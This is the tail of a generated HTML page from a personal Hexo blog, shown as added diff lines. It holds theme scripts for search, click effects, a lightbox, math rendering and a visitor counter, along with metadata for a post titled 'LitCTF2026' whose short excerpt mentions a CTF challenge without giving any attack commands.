+<script src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js" integrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l+M5Q2WH&#x2F;Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous" defer></script>
+
+  
+<script src="/js/algolia_search.js" defer></script>
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Ether",
+          title: "LitCTF2026",
+          url: "http://ether-lin.cn/2026/05/25/LitCTF2026/",
+          excerpt: "",
+          description: "",
+          stripContent: " 华辰企业服务运营平台 没思路，就dirsearch扫了一下，  访问喽，/actuator/env   Northbridge Document Hub  任意文件读取  先查看源码看看有什么东西 12345678910111213141516171819202122232425262728293031323334(function () &amp;#123;  var bootstrap = &amp;#123;    release: &amp;quot;2026.03.01-r12&amp;quot;,    regi",
+          date: "Mon May 25 2026 23:35:46 GMT+0800",
+          updated: "Fri May 29 2026 08:53:54 GMT+0800",
+          cover: "/images/covers/07.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js" integrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC+gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous" defer onload="renderMathInElement(_$(&#39;article&#39;), {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+  </body>
+  </html>
